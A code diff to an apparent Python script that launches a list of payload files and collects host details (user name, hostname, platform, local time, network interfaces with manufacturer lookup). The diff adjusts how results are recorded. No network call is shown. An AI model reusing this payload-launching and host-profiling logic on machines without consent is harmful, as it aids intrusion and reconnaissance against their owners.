@@ -35,7 +35,7 @@ def get_active_interfaces():
             registration = EUI(interface["mac"]).oui.registration()
             interface["mfg"] = registration.org
         except (NotRegisteredError, AddrFormatError):
-            interface["mfg"] = "Unknown"
+            interface["mfg"] = ""
         active.append(interface)
 
     return active
@@ -97,6 +97,7 @@ payload_results = []
 for payload in payloads:
     if platform_name == "Windows":
         os.startfile(payload)
+        payload_results.append(dict(args=payload, success=True))
     else:
         payload_results.append(dict(args=payload, success=launch_payload(payload)))
     sleep(1)
@@ -106,7 +107,7 @@ info = dict(
     platform=dict(name=platform_name, version=platform_version),
     user=getuser(),
     local_time=datetime.now().isoformat(),
-    fqdn=getfqdn(),
+    hostname=getfqdn().split(".")[0],
     active_interfaces=get_active_interfaces(),
     payloads=payload_results
 )
